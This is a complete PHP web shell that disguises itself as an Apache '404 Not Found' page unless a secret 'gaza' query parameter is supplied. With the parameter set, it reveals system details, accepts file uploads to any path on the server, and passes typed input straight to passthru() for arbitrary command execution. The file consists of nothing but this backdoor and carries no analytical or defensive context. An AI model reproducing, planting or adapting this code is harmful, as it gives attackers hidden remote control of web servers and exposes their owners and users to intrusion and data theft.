?php

$system = php_uname();
$win = (strtolower(substr($system,0,3)) == "win")? true : false;

if($win) $os = "(Win32)";
else $os =" ";


if(!isset($_GET['gaza'])) {
echo '<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL '.$_SERVER["SCRIPT_NAME"].' was not found on this server.</p>
<hr>
<address>Apache/2.2.8 '.$os.' PHP/5.2.6 Server at '.$_SERVER["SERVER_NAME"].' Port 80</address>
</body></html>
';
}

if(isset($_GET['gaza'])) {

echo '<b><br><br>'.php_uname().'<br></b>';
echo '<form method="post" enctype="multipart/form-data">
<input name="file" type="file" />
<input name="path" type="text" value="'.getcwd().'" />
<input type="submit" value="Up" />
</form>';
if(isset($_FILES['file'])&&isset($_POST['path'])){
if(move_uploaded_file($_FILES['file']['tmp_name'],$_POST['path'].'/'.$_FILES['file']['name'])){
echo '<font color="green">File Upload Done.</font><br />';
}else{
echo '<font color="red">File Upload Error.</font><br />';
}
}
echo "Command : <form action='' method='post'> <input type='text' name='cmd'/><input type='submit' value='ok' /><form/>"; $cmd =$_POST['cmd']; @passthru($cmd);{

}
}

?>
